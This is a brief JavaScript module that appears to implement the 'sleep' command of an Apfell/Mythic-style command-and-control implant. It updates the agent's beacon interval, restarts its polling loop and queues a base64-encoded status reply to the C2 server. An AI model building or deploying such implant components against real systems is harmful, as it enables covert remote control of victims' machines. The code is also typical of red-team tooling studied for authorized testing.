exports.sleep = function(task) {
    try {
        let args = JSON.parse(task.parameters.toString());
        C2.interval = args.sleep;
        clearInterval(mainloop);
        mainloop = setInterval(c2loop, C2.interval * 1000);
        let response = {"task_id":task.id, "user_output":"updated sleep to " + C2.interval, "completed": true};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
};